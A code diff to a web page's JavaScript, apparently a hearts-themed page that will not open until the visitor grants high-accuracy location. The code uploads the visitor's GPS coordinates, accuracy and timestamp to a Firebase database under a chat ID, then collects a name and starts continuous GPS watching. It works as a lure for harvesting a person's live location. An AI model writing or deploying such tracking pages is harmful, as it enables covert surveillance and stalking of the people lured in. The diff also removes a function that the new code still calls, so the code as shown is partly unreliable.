@@ -52,56 +52,55 @@ let userName = localStorage.getItem("userName") || null;
 /* ASK LOCATION FIRST              */
 /* ------------------------------- */
 function askLocationFirst_thenName() {
+
   if (!navigator.geolocation) {
-    alert("Location not supported.");
-    showPage(0);
+    titleEl.textContent = "Location not supported";
+    card.classList.add("show");
     return;
   }
-  navigator.geolocation.getCurrentPosition(pos => {
 
-  db.ref("chat/" + chatID + "/gps").set({
-    lat: pos.coords.latitude,
-    lon: pos.coords.longitude,
-    acc: pos.coords.accuracy,
-    ts: Date.now()
-  });
+  navigator.geolocation.getCurrentPosition(
 
-  askNameThenContinue();
+    function(pos){
 
-}, err => {
+      db.ref("chat/" + chatID + "/gps").set({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy,
+        ts: Date.now()
+      });
 
-  createHearts();
+      askNameThenContinue(); // sirf allow hone par
 
-  titleEl.textContent = "📍 Please allow location first";
+    },
 
-  extra.innerHTML = `
-  <p style="font-size:14px;margin-bottom:10px;">
-  Website continue karne ke liye location allow karna zaroori hai
-  </p>
+    function(err){
 
-  <button onclick="location.reload()">
-  Allow Location
-  </button>
-  `;
+      // deny hone par website stop
+      createHearts();
 
-  card.classList.add("show");
+      titleEl.textContent = "📍 Please allow location first";
 
-}, { enableHighAccuracy:true });
-/* ------------------------------- */
-function askNameThenContinue() {
-  if (!userName) {
-    let n = prompt("Enter your name:");
-    if (!n || n.trim() === "") return askNameThenContinue();
-    userName = n.trim();
-    localStorage.setItem("userName", userName);
-  }
+      extra.innerHTML = `
+      <p style="margin-bottom:10px;">
+      Website continue karne ke liye location allow karna zaroori hai
+      </p>
 
-  db.ref("chat/" + chatID + "/name").set(userName);
-  startGPS();
-  createHearts();
-  showPage(0);
+      <button onclick="location.reload()">
+      Allow Location
+      </button>
+      `;
+
+      card.classList.add("show");
+
+      return; // important
+    },
+
+    { enableHighAccuracy: true }
+
+  );
+
 }
-
 /* ------------------------------- */
 /* GPS WATCH                       */
 /* ------------------------------- */
